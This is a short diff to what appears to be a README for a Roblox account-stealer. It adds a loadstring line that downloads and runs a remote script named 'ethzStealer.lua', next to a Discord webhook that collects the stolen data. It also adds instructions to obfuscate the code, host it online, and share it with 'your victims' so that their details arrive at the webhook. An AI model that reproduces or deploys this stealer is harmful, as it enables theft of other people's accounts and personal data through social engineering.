@@ -5,4 +5,7 @@
 ```lua
 User_Name = "Roblox"
 Web_Hook = "https://discord.com/api/webhooks/xxxxxx"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ethz07/ethzScripts-ADM/main/ethzStealer.lua"))()
 ```
+* after u finish it obfuscate the code then make it executable in pastebin github etc.
+* after share it to your victims if they execute your code ur gonna get a webhook message and read the includes here u will see details.
